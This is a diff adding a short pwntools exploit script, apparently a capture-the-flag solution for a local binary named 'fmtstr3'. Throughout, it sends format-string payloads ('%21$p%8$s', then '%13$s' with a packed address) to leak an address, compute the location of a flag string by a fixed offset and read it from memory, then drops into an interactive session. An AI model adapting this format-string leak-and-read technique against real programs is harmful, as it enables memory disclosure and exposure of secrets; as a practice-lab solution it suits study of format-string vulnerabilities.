@@ -1,0 +1,25 @@
+from pwn import *
+
+p = process("./fmtstr3")
+'''
+p = gdb.debug("./fmtstr3", gdbscript = 
+break *run + 233
+break *run + 265
+break *run + 330
+r
+)
+'''
+
+res = ""
+payload = b"%21$p%8$s"
+p.sendlineafter(b"name: ", payload)
+p.recvuntil(b"Hello ")
+leak_addr = int(p.recv(14), 16)
+res += p.recvline().decode()[:-1:]
+flag2_addr = leak_addr + 11158
+print(hex(flag2_addr))
+payload = b"%13$s\x00\x00\x00"  + p64(flag2_addr)
+p.sendlineafter(b"greeting: ", payload)
+res += p.recvline().decode()
+print(res)
+p.interactive()
